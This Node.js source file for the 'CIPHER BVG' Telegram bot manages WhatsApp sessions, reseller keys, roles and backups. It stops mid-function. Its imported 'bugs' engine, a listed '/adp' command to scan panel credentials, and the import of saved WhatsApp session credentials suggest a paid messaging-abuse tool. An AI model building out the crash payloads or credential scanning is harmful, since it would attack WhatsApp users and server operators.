/**
 * CIPHER BVG — telegram.js
 * Telegram admin bot, ported from index.js. Keeps every original command
 * (/start /addbot /listbot /delbot /delsesi /addsender /adp /ckey /mykeys
 * /listkey /delkey /addacces /delacces /addreseller /delreseller /addpt
 * /delpt /addmod /delmod /addowner /delowner) and adds the UID-based
 * premium activation system (/premium /premium-check /premium-off).
 */
const fs = require("fs");
const path = require("path");
const os = require("os");
const chalk = require("chalk");
const axios = require("axios");
const AdmZip = require("adm-zip");
const tar = require("tar");

const db = require("./database");
const { registerCommandAdmin } = require("./commandAdmin");
const { escapeHtml } = require("./html");
const { wa, bugs, available: ENGINE_AVAILABLE, loadError: ENGINE_ERROR } = require("./engine");

// Banners are env-overridable, so they come from Database/config.js
// (which reads BANNER_TELEGRAM / BANNER_DASHBOARD / BANNER_LOGIN).
const runtimeConfig = require("../Database/config.js");
const BOT_NAME    = "CIPHER BVG";
const BOT_VERSION = "7.0.0";
const CREATOR     = "Cipher";

const RESELLER_KEY_LIMIT = 10;
const VALID_ROLES = ["owner", "admin", "reseller", "moderator", "member"];

/* ── ported helpers ───────────────────────────────────────────────── */
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function parseDuration(str) {
  const match = String(str || "").match(/^(\d+)([dh])$/);
  if (!match) return null;
  const v = parseInt(match[1]);
  return match[2] === "d" ? v * 86400000 : v * 3600000;
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/* ── register commands on the given Telegraf bot ──────────────────── */
function registerBot(bot, { ownerId }) {
  const tgNotify = async (text) => {
    try { await bot.telegram.sendMessage(ownerId, text, { parse_mode: "HTML" }); } catch {}
  };

  const pendingConnectorInput = new Map();
  const pendingSessionUpload = new Set();
  const userKey = (ctx) => `${ctx.chat && ctx.chat.id || ctx.from.id}:${ctx.from.id}`;
  const canConnectNumber = (id) => db.isOwner(id) || db.isAuthorized(id) || db.isPairOnly(id);

  const connectorMenuKeyboard = (ctx) => {
    const id = ctx.from.id.toString();
    const rows = [];
    if (canConnectNumber(id)) rows.push([{ text: "➕ Add WhatsApp number", callback_data: "wa:add" }]);
    if (db.isOwner(id)) {
      rows.push([{ text: "📱 View / remove connected sessions", callback_data: "wa:list" }]);
      rows.push([{ text: "📤 Import saved session file", callback_data: "wa:import" }]);
    }
    rows.push([{ text: "✖ Cancel / close", callback_data: "wa:cancel" }]);
    return { inline_keyboard: rows };
  };

  const connectorCancelKeyboard = () => ({
    inline_keyboard: [[{ text: "✖ Cancel", callback_data: "wa:cancel" }]],
  });

  const showConnectorPanel = async (ctx, text, replyMarkup) => {
    const message = ctx.callbackQuery && ctx.callbackQuery.message;
    const options = { parse_mode: "HTML", reply_markup: replyMarkup };
    if (message) {
      try {
        if (message.photo) return await ctx.editMessageCaption(text, options);
        return await ctx.editMessageText(text, options);
      } catch {}
    }
    return ctx.reply(text, options);
  };

  const removeWhatsAppSession = (number) => {
    if (wa.cancelPairing) wa.cancelPairing(number, "Session removed by the Telegram owner.");
    if (wa.reconnectTimers.has(number)) {
      clearTimeout(wa.reconnectTimers.get(number));
      wa.reconnectTimers.delete(number);
    }
    const active = wa.sessions.get(number);
    if (active) {
      try { active.end(); } catch {}
      wa.sessions.delete(number);
    }
    wa.delActive ? wa.delActive(number) : db.delActive(number);
    if (wa.wipeDir) wa.wipeDir(number);
    try { db.updatePairingStatus(number, "cancelled"); } catch {}
    const users = db.getUsers();
    let changed = false;
    users.forEach((user) => {
      if (user.pairedNumber === number) {
        user.pairedNumber = null;
        user.pairedAt = null;
        changed = true;
      }
    });
    if (changed) db.saveUsers(users);
  };

  bot.use(async (ctx, next) => {
    const text = String(ctx.message && ctx.message.text || "").trim();
    if (text.startsWith("/")) {
      const key = userKey(ctx);
      pendingConnectorInput.delete(key);
      pendingSessionUpload.delete(key);
    }
    return next();
  });

  /* /start — preserved from source */
  bot.command("start", async (ctx) => {
    const username = escapeHtml(ctx.from.username || ctx.from.first_name || "User");
    const teks = `<b>${BOT_NAME}</b>\nA Telegram-connected WhatsApp tool built by <b>${CREATOR}</b>.\nUse the buttons below for WhatsApp connector actions; existing slash commands are still available.\n\n<blockquote><b>[ User Info ]</b></blockquote>\n> Creator : ${CREATOR}\n> Version : ${BOT_VERSION}\n> Username : ${username}\n\n<blockquote><b>[ Bot Management ]</b></blockquote>\n│ /addbot — Add WhatsApp sender\n│ /listbot — List active senders\n│ /delbot — Remove sender\n│ /delsesi — Delete session\n│ /addsender — Upload session file\n│ /adp — Scan panel creds\n|_____________\n<blockquote><b>[ Key Management ]</b></blockquote>\n│ /ckey — Create user key (username,30d,,Role)\n│ /mykeys — View your created keys\n│ /listkey — List ALL keys [owner only]\n│ /delkey — Delete a key\n|_____________\n<blockquote><b>[ Access Management ]</b></blockquote>\n│ /addacces &lt;id&gt; [pair]  — full or pair-only [owner]\n│ /delacces  [owner]\n│ /addreseller / /delreseller  [owner/pt/mod]\n│ /addpt / /delpt  [owner/mod]\n│ /addmod / /delmod  [owner]\n│ /addowner / /delowner  [owner]\n|_____________\n<blockquote><b>[ Premium Management ]</b></blockquote>\n│ /premium &lt;UID&gt; — activate premium via account UID [owner/admin]\n│ /premium-check &lt;UID&gt; — check premium status [owner/admin]\n│ /premium-off &lt;UID&gt; — deactivate premium [owner/admin]\n|_____________\n<blockquote><b>[ CMD Tier Manager ]</b></blockquote>\n│ /commands — tap-to-toggle FREE / PREMIUM panel\n│ /cmdlist — list every command with its tier\n│ /cmdfree — show free commands only\n│ /cmdpremium — show premium commands only\n│ /cmdset &lt;cmd&gt; &lt;free|premium|admin&gt; — set a tier directly\n|_____________\n<blockquote><b>[ Database Backup ]</b></blockquote>\n│ /backup — status + one-tap download [owner]`;
    const banner = runtimeConfig.bannerTelegram;
    const channel = (() => {
      try { return require("../Database/owner.json").owner.channel || "https://t.me/"; }
      catch { return "https://t.me/"; }
    })();
    try {
      await ctx.replyWithPhoto(
        { url: banner },
        {
          caption: teks,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔌 WhatsApp Connector", callback_data: "wa:menu" }],
              ...(canConnectNumber(ctx.from.id.toString())
                ? [[{ text: "➕ Add WhatsApp number", callback_data: "wa:add" }]]
                : []),
              ...(db.isOwner(ctx.from.id.toString())
                ? [[{ text: "📱 Sessions / Import", callback_data: "wa:menu" }]]
                : []),
              [{ text: "📢 Channel", url: channel }],
              // only managers see the tier panel shortcut
              ...(db.isOwner(ctx.from.id.toString()) ||
              db.isModerator(ctx.from.id.toString()) ||
              db.isAuthorized(ctx.from.id.toString())
                ? [[{ text: "⚙️ CMD Tier Manager", callback_data: "refresh" }]]
                : []),
              // backups are owner-only — they carry Database/.pepper
              ...(db.isOwner(ctx.from.id.toString())
                ? [[{ text: "🗄 Backup database", callback_data: "backup:run" }]]
                : []),
            ],
          },
        }
      );
    } catch {
      await ctx.reply(teks, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔌 WhatsApp Connector", callback_data: "wa:menu" }],
            ...(canConnectNumber(ctx.from.id.toString()) ? [[{ text: "➕ Add WhatsApp number", callback_data: "wa:add" }]] : []),
            ...(db.isOwner(ctx.from.id.toString()) ? [[{ text: "📱 Sessions / Import", callback_data: "wa:menu" }]] : []),
            [{ text: "📢 Channel", url: channel }],
          ],
        },
      });
    }
  });

  /* ── FREE / PREMIUM command manager (/commands, /cmdset, …) ──────── */
  registerCommandAdmin(bot, { ownerId });

  /* ── database backup (/backup + inline button) ─────────────────────
   * Owner-only, by design: the archive contains Database/.pepper, so
   * leaking it would let anyone verify password hashes offline.
   */
  const backup = require("./backup");

  const isOwnerOnly = (ctx) => db.isOwner(ctx.from.id.toString());

  const backupKeyboard = () => ({
    inline_keyboard: [
      [{ text: "🗄 Backup now", callback_data: "backup:run" }],
      [{ text: "📊 Status", callback_data: "backup:status" }],
    ],
  });

  const backupStatusText = () => {
    const s = backup.backupStatus();
    const fmt = (ms) => (ms ? new Date(ms).toUTCString() : "—");
    return (
      `<b>🗄 CIPHER BVG — Backup</b>\n\n` +
      `<b>Auto loop  :</b> ${s.running ? "✅ running" : "⛔ stopped"}\n` +
      `<b>Interval   :</b> every ${s.intervalHours} h\n` +
      `<b>Runs       :</b> ${s.runs}\n` +
      `<b>Last run   :</b> <i>${fmt(s.lastRun)}</i>\n` +
      `<b>Last error :</b> ${s.lastError ? `<code>${escapeHtml(s.lastError)}</code>` : "—"}\n` +
      `<b>On disk    :</b> ${s.onDisk} archive(s)\n\n` +
      `<blockquote>Tap <b>Backup now</b> to download a fresh archive immediately.</blockquote>`
    );
  };

  bot.command("backup", async (ctx) => {
    if (!isOwnerOnly(ctx)) return ctx.reply("[!] Access denied.");
    await ctx.reply(backupStatusText(), {
      parse_mode: "HTML",
      reply_markup: backupKeyboard(),
    });
  });

  /* ── backup button presses ──────────────────────────────────────── */
  bot.on("callback_query", async (ctx, next) => {
    const data = ctx.callbackQuery && ctx.callbackQuery.data;
    if (!data || (data !== "backup:run" && data !== "backup:status")) return next();

    if (!isOwnerOnly(ctx)) {
      return ctx.answerCbQuery("Access denied.", { show_alert: true }).catch(() => {});
    }

    if (data === "backup:status") {
      await ctx.answerCbQuery().catch(() => {});
      return ctx
        .editMessageText(backupStatusText(), {
          parse_mode: "HTML",
          reply_markup: backupKeyboard(),
        })
        .catch(() => {});
    }

    /* backup:run — answer the tap, then deliver the file itself */
    await ctx.answerCbQuery("Building backup…").catch(() => {});

    try {
      // Always deliver to the owner's private chat, never to whatever chat
      // the button was tapped in — the archive carries Database/.pepper.
      const built = await backup.sendBackup(bot.telegram, ownerId, "manual");
      db.logAudit({
        event: "backup.manual",
        admin: ctx.from.id.toString(),
        chat: String(ctx.chat && ctx.chat.id),
        file: built.name,
        bytes: built.bytes,
        files: built.files.length,
      });
    } catch (err) {
      await ctx.reply(`[x] Backup failed: <code>${escapeHtml(err.message)}</code>`, { parse_mode: "HTML" }).catch(() => {});
    }
  });

  /* ── WhatsApp connector inline-button flow ─────────────────────── */
  bot.on("callback_query", async (ctx, next) => {
    const data = ctx.callbackQuery && ctx.callbackQuery.data;
    if (!data || !data.startsWith("wa:")) return next();
    const id = ctx.from.id.toString();
    const key = userKey(ctx);

    if (data === "wa:menu" || data === "wa:back") {
      await ctx.answerCbQuery().catch(() => {});
      return showConnectorPanel(
        ctx,
        `<b>🔌 WhatsApp Connector</b>\n\nUse the buttons below to add, view, remove, or import WhatsApp sessions. Your existing slash commands still work.`,
        connectorMenuKeyboard(ctx)
      );
    }

    if (data === "wa:cancel") {
      pendingConnectorInput.delete(key);
      pendingSessionUpload.delete(key);
      await ctx.answerCbQuery("Cancelled").catch(() => {});
      return showConnectorPanel(ctx, `<b>🔌 WhatsApp Connector</b>\n\nChoose an action:`, connectorMenuKeyboard(ctx));
    }

    if (data === "wa:add") {
      if (!canConnectNumber(id)) return ctx.answerCbQuery("Access denied.", { show_alert: true }).catch(() => {});
      pendingConnectorInput.set(key, { kind: "add-number" });
      await ctx.answerCbQuery().catch(() => {});
      return showConnectorPanel(
        ctx,
        `<b>➕ Add WhatsApp number</b>\n\nSend the number in international format.\nExample: <code>+92 300 1234567</code>\n\nThis starts WhatsApp pairing; it does not send an SMS OTP.`,
        connectorCancelKeyboard()
      );
    }

    if (data === "wa:import") {
      if (!db.isOwner(id)) return ctx.answerCbQuery("Owner only.", { show_alert: true }).catch(() => {});
      pendingSessionUpload.add(key);
      await ctx.answerCbQuery().catch(() => {});
      return showConnectorPanel(
        ctx,
        `<b>📤 Import saved session</b>\n\nNow send the session <code>.zip</code>, <code>.tar.gz</code>, or <code>.json</code> file here. The bot will import it automatically.`,
        connectorCancelKeyboard()
      );
    }

    if (data === "wa:list") {
      if (!db.isOwner(id)) return ctx.answerCbQuery("Owner only.", { show_alert: true }).catch(() => {});
      await ctx.answerCbQuery().catch(() => {});
      const numbers = [...wa.sessions.keys()];
      const keyboard = [];
      for (let i = 0; i < numbers.length; i += 2) {
        keyboard.push(numbers.slice(i, i + 2).map((number) => ({
          text: `🗑 ${number}`,
          callback_data: `wa:confirm_remove:${number}`,
        })));
      }
      keyboard.push([{ text: "🔄 Refresh", callback_data: "wa:list" }, { text: "⬅️ Back", callback_data: "wa:back" }]);
      const text = numbers.length
        ? `<b>📱 Connected WhatsApp sessions (${numbers.length})</b>\n\nTap a session to remove it.\n\n${numbers.map((number, i) => `${i + 1}. <code>${escapeHtml(number)}</code>`).join("\n")}`
        : `<b>📱 Connected WhatsApp sessions</b>\n\nNo active sessions are connected.`;
      return showConnectorPanel(ctx, text, { inline_keyboard: keyboard });
    }

    if (data.startsWith("wa:confirm_remove:")) {
      if (!db.isOwner(id)) return ctx.answerCbQuery("Owner only.", { show_alert: true }).catch(() => {});
      const number = wa.normalizePhoneNumber(data.slice("wa:confirm_remove:".length));
      if (!number || !wa.sessions.has(number)) return ctx.answerCbQuery("Session is no longer active.", { show_alert: true }).catch(() => {});
      await ctx.answerCbQuery().catch(() => {});
      return showConnectorPanel(
        ctx,
        `<b>Remove this WhatsApp session?</b>\n\n<code>${escapeHtml(number)}</code>\n\nThis disconnects it and removes its saved session from this server.`,
        { inline_keyboard: [[{ text: "🗑 Yes, remove", callback_data: `wa:remove:${number}` }, { text: "Cancel", callback_data: "wa:list" }]] }
      );
    }

    if (data.startsWith("wa:remove:")) {
      if (!db.isOwner(id)) return ctx.answerCbQuery("Owner only.", { show_alert: true }).catch(() => {});
      const number = wa.normalizePhoneNumber(data.slice("wa:remove:".length));
      if (!number) return ctx.answerCbQuery("Invalid number.", { show_alert: true }).catch(() => {});
      removeWhatsAppSession(number);
      await ctx.answerCbQuery("Session removed").catch(() => {});
      const numbers = [...wa.sessions.keys()];
      const keyboard = [];
      for (let i = 0; i < numbers.length; i += 2) keyboard.push(numbers.slice(i, i + 2).map((n) => ({ text: `🗑 ${n}`, callback_data: `wa:confirm_remove:${n}` })));
      keyboard.push([{ text: "🔄 Refresh", callback_data: "wa:list" }, { text: "⬅️ Back", callback_data: "wa:back" }]);
      const text = numbers.length
        ? `<b>✅ Session removed</b>\n\n<code>${escapeHtml(number)}</code>\n\n<b>Remaining sessions:</b>\n${numbers.map((n, i) => `${i + 1}. <code>${escapeHtml(n)}</code>`).join("\n")}`
        : `<b>✅ Session removed</b>\n\n<code>${escapeHtml(number)}</code>\n\nNo active sessions remain.`;
      return showConnectorPanel(ctx, text, { inline_keyboard: keyboard });
    }

    return next();
  });

  /* ── role management (ported makeRoleCommand + specific commands) ── */
  const makeRoleCommand = (addCmd, delCmd, roleName, checkFn) => {
    bot.command(addCmd, (ctx) => {
      const userId = ctx.from.id.toString();
      const id     = ctx.message.text.split(" ")[1];
      if (!checkFn(userId)) return ctx.reply("[!] Access denied.");
      if (!id) return ctx.reply(`Usage: /${addCmd} <id>`);
      const data = db.loadAkses();
      if (data[roleName].includes(id)) return ctx.reply(`[x] Already a ${roleName}.`);
      data[roleName].push(id);
      db.saveAkses(data);
      ctx.reply(`[+] Added ${id} as ${roleName}.`);
    });
    bot.command(delCmd, (ctx) => {
      const userId = ctx.from.id.toString();
      const id     = ctx.message.text.split(" ")[1];
      if (!checkFn(userId)) return ctx.reply("[!] Access denied.");
      if (!id) return ctx.reply(`Usage: /${delCmd} <id>`);
      const data = db.loadAkses();
      data[roleName] = data[roleName].filter(u => u !== id);
      db.saveAkses(data);
      ctx.reply(`[+] Removed ${id} from ${roleName}.`);
    });
  };

  makeRoleCommand("addreseller", "delreseller", "resellers",  id => db.isOwner(id) || db.isPT(id) || db.isModerator(id));
  makeRoleCommand("addpt",       "delpt",       "pts",        id => db.isOwner(id) || db.isModerator(id));
  makeRoleCommand("addmod",      "delmod",      "moderators", id => db.isOwner(id));

  bot.command("addacces", (ctx) => {
    const userId = ctx.from.id.toString();
    const parts  = ctx.message.text.trim().split(/\s+/);
    const id     = parts[1];
    const flag   = (parts[2] || "").toLowerCase();

    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply(
      "Usage:\n" +
      "  /addacces <id>       — full access\n" +
      "  /addacces <id> pair  — pairing only (can use /addbot, nothing else)"
    );

    const data = db.loadAkses();

    if (flag === "pair") {
      if (data.akses.includes(id)) data.akses = data.akses.filter(u => u !== id);
      if (data.pairOnly.includes(id)) return ctx.reply("[x] Already has pair-only access.");
      data.pairOnly.push(id);
      db.saveAkses(data);
      return ctx.reply(
        `[+] Pair-only access granted to: <code>${escapeHtml(id)}</code>\n` +
        `They can use /addbot to pair a number, nothing else.`,
        { parse_mode: "HTML" }
      );
    }

    if (data.pairOnly.includes(id)) data.pairOnly = data.pairOnly.filter(u => u !== id);
    if (data.akses.includes(id)) return ctx.reply("[x] Already has full access.");
    data.akses.push(id);
    db.saveAkses(data);
    ctx.reply(`[+] Full access granted to: <code>${escapeHtml(id)}</code>`, { parse_mode: "HTML" });
  });

  bot.command("delacces", (ctx) => {
    const userId = ctx.from.id.toString();
    const id     = ctx.message.text.trim().split(/\s+/)[1];
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply("Usage: /delacces <id>");
    const data = db.loadAkses();
    const inFull = data.akses.includes(id);
    const inPair = data.pairOnly.includes(id);
    if (!inFull && !inPair) return ctx.reply("[x] ID not found in any access list.");
    if (inFull) data.akses = data.akses.filter(u => u !== id);
    if (inPair) data.pairOnly = data.pairOnly.filter(u => u !== id);
    db.saveAkses(data);
    ctx.reply(`[+] Access removed from: <code>${escapeHtml(id)}</code>`, { parse_mode: "HTML" });
  });

  bot.command("addowner", (ctx) => {
    const userId = ctx.from.id.toString();
    const id     = ctx.message.text.split(" ")[1];
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply("Usage: /addowner <id>");
    const data = db.loadAkses();
    if (data.owners.includes(id)) return ctx.reply("[x] Already an owner.");
    data.owners.push(id);
    db.saveAkses(data);
    ctx.reply(`[+] Owner added: ${id}`);
  });

  bot.command("delowner", (ctx) => {
    const userId = ctx.from.id.toString();
    const id     = ctx.message.text.split(" ")[1];
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (!id) return ctx.reply("Usage: /delowner <id>");
    const data = db.loadAkses();
    data.owners = data.owners.filter(u => u !== id);
    db.saveAkses(data);
    ctx.reply(`[+] Owner removed: ${id}`);
  });

  /* ── bot / session management (ported) ──────────────────────────── */
  bot.command("addbot", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId) && !db.isAuthorized(userId) && !db.isPairOnly(userId))
      return ctx.reply("[!] Access denied.");
    const args = String(ctx.message.text || "").trim().split(/\s+/);
    if (args.length < 2) return ctx.reply("Usage: /addbot +923001234567 (or /addbot 03001234567)");
    await wa.connectToWhatsApp(args[1], ctx);
  });

  bot.command("listbot", (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (wa.sessions.size === 0) return ctx.reply("No active senders.");
    ctx.reply(`Active Senders:\n${[...wa.sessions.keys()].map(n => `- ${n}`).join("\n")}`);
  });

  bot.command("delbot", async (ctx) => {
    const userId = ctx.from.id.toString();
    const args   = String(ctx.message.text || "").trim().split(/\s+/);
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    if (args.length < 2) return ctx.reply("Usage: /delbot +923001234567");
    const number = wa.normalizePhoneNumber(args[1]);
    if (!wa.sessions.has(number)) return ctx.reply("Sender not found.");
    try {
      removeWhatsAppSession(number);
      ctx.reply(`[+] Session for ${number} removed.`);
    } catch (err) {
      ctx.reply(`[x] Error removing session: ${err.message}`);
    }
  });

  bot.command("delsesi", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    const num = wa.normalizePhoneNumber(String(ctx.message.text || "").trim().split(/\s+/).slice(1)[0] || "");
    if (!num) return ctx.reply("Usage: /delsesi <number>");
    try {
      removeWhatsAppSession(num);
      ctx.reply(`[+] Session for ${num} deleted.`);
    } catch (err) {
      ctx.reply(`[x] Failed: ${err.message}`);
    }
  });

  /* ── key management (ported) ────────────────────────────────────── */
  bot.command("ckey", async (ctx) => {
    const userId    = ctx.from.id.toString();
    const rawArgs   = ctx.message.text.split(" ").slice(1).join(" ").trim();
    const isOwnerU  = db.isOwner(userId);
    const canCreate = isOwnerU || db.isReseller(userId) || db.isPT(userId) || db.isModerator(userId) || db.isAuthorized(userId);
    if (!canCreate) return ctx.reply("[!] Access denied.");
    if (!rawArgs || !rawArgs.includes(",")) return ctx.reply(
      "Usage:\n" +
      "  /ckey username,30d\n" +
      "  /ckey username,12h,customkey\n" +
      "  /ckey username,30d,,Admin\n" +
      "  /ckey username,30d,customkey,Reseller\n\n" +
      "Roles: Owner · Admin · Reseller · Moderator · Member"
    );

    const parts      = rawArgs.split(",");
    const username   = parts[0].trim();
    const durasiStr  = parts[1] ? parts[1].trim() : "";
    const customKey  = parts[2] ? parts[2].trim() : null;
    const roleRaw    = parts[3] ? parts[3].trim() : null;
    const durationMs = parseDuration(durasiStr);
    if (!durationMs) return ctx.reply("[x] Invalid duration. Use: 7d / 1d / 12h");

    let role = "Member";
    if (roleRaw) {
      const roleLower = roleRaw.toLowerCase();
      if (!VALID_ROLES.includes(roleLower)) {
        return ctx.reply(
          `[x] Invalid role: <b>${escapeHtml(roleRaw)}</b>\nValid roles: ${VALID_ROLES.map(r => r.charAt(0).toUpperCase() + r.slice(1)).join(", ")}`,
          { parse_mode: "HTML" }
        );
      }
      if ((roleLower === "owner" || roleLower === "admin") && !isOwnerU) {
        return ctx.reply("[!] Only the owner can assign Owner or Admin roles.");
      }
      role = roleRaw.charAt(0).toUpperCase() + roleRaw.slice(1).toLowerCase();
    }

    const users = db.getUsers();
    if (!isOwnerU) {
      const myKeys = users.filter(u => u.createdBy === userId);
      if (myKeys.length >= RESELLER_KEY_LIMIT)
        return ctx.reply(`[x] Key limit reached (${RESELLER_KEY_LIMIT}). Delete old keys with /delkey first.`);
    }

    const key     = customKey || generateKey(4);
    const expired = Date.now() + durationMs;
    const idx     = users.findIndex(u => u.username === username);
    // every account needs a UID, otherwise /premium can never target it
    const existingUid = idx !== -1 ? users[idx].uid : null;
    const uid     = existingUid || db.generateUID();
    if (!uid) return ctx.reply("[x] Could not allocate a UID. Try again.");

    const entry   = { username, key, expired, role, createdBy: userId, uid };
    if (idx !== -1) users[idx] = { ...users[idx], ...entry };
    else users.push(entry);
    db.saveUsers(users);

    const expStr = new Date(expired).toLocaleString("en-NG", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos",
    });

    const roleEmoji = { Owner: "👑", Admin: "🛡️", Reseller: "🏪", Moderator: "🔧", Member: "✅" };
    const emoji = roleEmoji[role] || "✅";

    await ctx.reply("[+] Key created. Check your DM.");
    try {
      await ctx.telegram.sendMessage(ctx.from.id,
        `[+] <b>Key Created — ${BOT_NAME}</b>\n\n` +
        `<b>Username :</b> <code>${escapeHtml(username)}</code>\n` +
        `<b>Password :</b> <code>${escapeHtml(key)}</code>\n` +
        `<b>UID      :</b> <code>${escapeHtml(uid)}</code>\n` +
        `<b>Role     :</b> ${emoji} ${role}\n` +
        `<b>Expired  :</b> <i>${expStr} WAT</i>`,
        { parse_mode: "HTML" }
      );
    } catch {
      await ctx.reply("[!] Could not DM you. Start a private chat with me first, then retry.");
    }
  });

  bot.command("listkey", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Access denied.");
    const users = db.getUsers();
    if (users.length === 0) return ctx.reply("No keys created yet.");
    const now = Date.now();
    let text  = `<b>${BOT_NAME} — All Keys</b>\n\n`;
    users.forEach((u, i) => {
      const exp    = new Date(u.expired).toLocaleString("en-NG", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
      const status = u.expired && now > u.expired ? "EXPIRED" : "ACTIVE";
      const role   = u.role || "Member";
      text += `${i + 1}. <code>${escapeHtml(u.username)}</code> [${escapeHtml(role)}] ${status}\n   Key: <code>${escapeHtml(u.key)}</code>\n   Expired: ${exp} WAT\n   By: <code>${escapeHtml(u.createdBy || "owner")}</code>\n\n`;
    });
    ctx.reply(text, { parse_mode: "HTML" });
  });

  bot.command("mykeys", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId) && !db.isAuthorized(userId)) return ctx.reply("[!] Access denied.");
    const users  = db.getUsers();
    const myKeys = db.isOwner(userId) ? users : users.filter(u => u.createdBy === userId);
    if (myKeys.length === 0) return ctx.reply("You have no keys created.");
    const now = Date.now();
    let text  = `<b>${BOT_NAME} — Your Keys (${myKeys.length}/${db.isOwner(userId) ? "unlimited" : RESELLER_KEY_LIMIT})</b>\n\n`;
    myKeys.forEach((u, i) => {
      const exp    = new Date(u.expired).toLocaleString("en-NG", { year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
      const status = u.expired && now > u.expired ? "EXPIRED" : "ACTIVE";
      const role   = u.role || "Member";
      text += `${i + 1}. <code>${escapeHtml(u.username)}</code> [${escapeHtml(role)}] ${status}\n   Key: <code>${escapeHtml(u.key)}</code>\n   Exp: ${exp} WAT\n\n`;
    });
    ctx.reply(text, { parse_mode: "HTML" });
  });

  bot.command("delkey", (ctx) => {
    const userId   = ctx.from.id.toString();
    const username = ctx.message.text.split(" ")[1];
    if (!db.isOwner(userId) && !db.isAuthorized(userId)) return ctx.reply("[!] Access denied.");
    if (!username) return ctx.reply("Usage: /delkey <username>");
    const users = db.getUsers();
    const idx   = users.findIndex(u => u.username === username);
    if (idx === -1) return ctx.reply(`[x] Username "${username}" not found.`);
    if (!db.isOwner(userId) && users[idx].createdBy !== userId) return ctx.reply("[!] You can only delete keys you created.");
    users.splice(idx, 1);
    db.saveUsers(users);
    ctx.reply(`[+] Key for "${username}" deleted.`);
  });

  /* ── session upload (/addsender + import button) ────────────────── */
  const importSessionFile = async (ctx, doc) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Owner only.");
    const name = String(doc.file_name || "session.zip").toLowerCase();
    if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext)))
      return ctx.reply("[x] Supported session files: .json, .zip, .tar, .tar.gz, .tgz");

    let tmp = null;
    await ctx.reply("[..] Importing the WhatsApp session securely...");
    try {
      const fileLink = await ctx.telegram.getFileLink(doc.file_id);
      const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer", timeout: 60000 });
      const buf = Buffer.from(data);
      tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "cipher-session-"));

      if (name.endsWith(".json")) {
        await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
      } else if (name.endsWith(".zip")) {
        new AdmZip(buf).extractAllTo(tmp, true);
      } else {
        const tmpTar = path.join(tmp, path.basename(name));
        await fs.promises.writeFile(tmpTar, buf);
        await tar.x({ file: tmpTar, cwd: tmp, strict: true });
      }

      const findCreds = async (dir) => {
        const entries = await fs.promises.readdir(dir, { withFileTypes: true });
        for (const entry of entries) {
          const candidate = path.join(dir, entry.name);
          if (entry.isDirectory()) {
            const found = await findCreds(candidate);
            if (found) return found;
          } else if (entry.name === "creds.json") return candidate;
        }
        return null;
      };

      const credsPath = await findCreds(tmp);
      if (!credsPath) return ctx.reply("[x] creds.json was not found. Upload the complete Baileys session folder as a .zip.");
      const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
      const rawId = creds && creds.me && creds.me.id ? String(creds.me.id).split(":")[0].split("@")[0] : "";
      const botNumber = wa.normalizePhoneNumber(rawId);
      if (!botNumber || botNumber.length < 7 || botNumber.length > 15)
        return ctx.reply("[x] Invalid session: a valid WhatsApp phone number was not found in creds.json.");

      if (wa.cancelPairing) wa.cancelPairing(botNumber, "Pending pairing replaced by uploaded session.");
      const destDir = wa.sessionPath(botNumber);
      if (wa.reconnectTimers.has(botNumber)) {
        clearTimeout(wa.reconnectTimers.get(botNumber));
        wa.reconnectTimers.delete(botNumber);
      }
      if (wa.sessions.has(botNumber)) {
        try { wa.sessions.get(botNumber).end(); } catch {}
        wa.sessions.delete(botNumber);
      }
      await fs.promises.rm(destDir, { recursive: true, force: true });
      await fs.promises.mkdir(destDir, { recursive: true });

      const copyDir = async (src, dest) => {
        const entries = await fs.promises.readdir(src, { withFileTypes: true });
        for (const entry of entries) {
          const srcPath = path.join(src, entry.name), destPath = path.join(dest, entry.name);
          if (entry.isDirectory()) {
            await fs.promises.mkdir(destPath, { recursive: true });
            await copyDir(srcPath, destPath);
          } else {
            await fs.promises.copyFile(srcPath, destPath);
          }
        }
      };
      await copyDir(path.dirname(credsPath), destDir);
      await wa.connectToWhatsApp(botNumber, ctx, { preserveSession: true });
    } catch (err) {
      console.error("addsender error:", err);
      await ctx.reply(`[x] Session import failed: <code>${escapeHtml(err.message)}</code>`, { parse_mode: "HTML" }).catch(() => {});
    } finally {
      if (tmp) await fs.promises.rm(tmp, { recursive: true, force: true }).catch(() => {});
    }
  };

  bot.command("addsender", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!db.isOwner(userId)) return ctx.reply("[!] Owner only.");
    const replyMsg = ctx.message && ctx.message.reply_to_message;
    if (!replyMsg || !replyMsg.document) {
      return ctx.reply(
        "To add a saved WhatsApp session: send the session .zip to this bot, then reply to that file with /addsender. The archive must include creds.json and its matching key files. For a fresh number, use /addbot +923001234567."
      );
    }
    return importSessionFile(ctx, replyMsg.document);
